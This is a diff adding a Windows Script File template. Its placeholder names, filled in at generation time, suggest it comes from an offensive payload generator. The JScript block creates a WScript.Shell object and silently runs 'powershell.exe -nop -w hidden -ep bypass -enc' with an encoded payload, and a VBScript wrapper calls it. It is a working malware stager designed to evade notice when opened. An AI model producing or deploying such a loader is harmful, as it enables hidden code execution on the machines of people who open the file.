@@ -1,0 +1,18 @@
+<?xml version="1.0" ?>
+<job id="{{WSF_JOB}}">
+<script language="JScript">
+function {{JSF_ENTRY}}(){
+var {{JSV_SHELL}}=new ActiveXObject("WScript.Shell");
+var {{JSV_CMD}}="powershell.exe -nop -w hidden -ep bypass -enc {{PS_ENCODED}}";
+{{JSV_SHELL}}.Run({{JSV_CMD}},0,true);
+}
+</script>
+<script language="VBScript">
+'<![CDATA[
+Function {{VBF_CALLER}}()
+    {{JSF_ENTRY}} 1
+End Function
+{{VBF_CALLER}}
+']]>
+</script>
+</job>
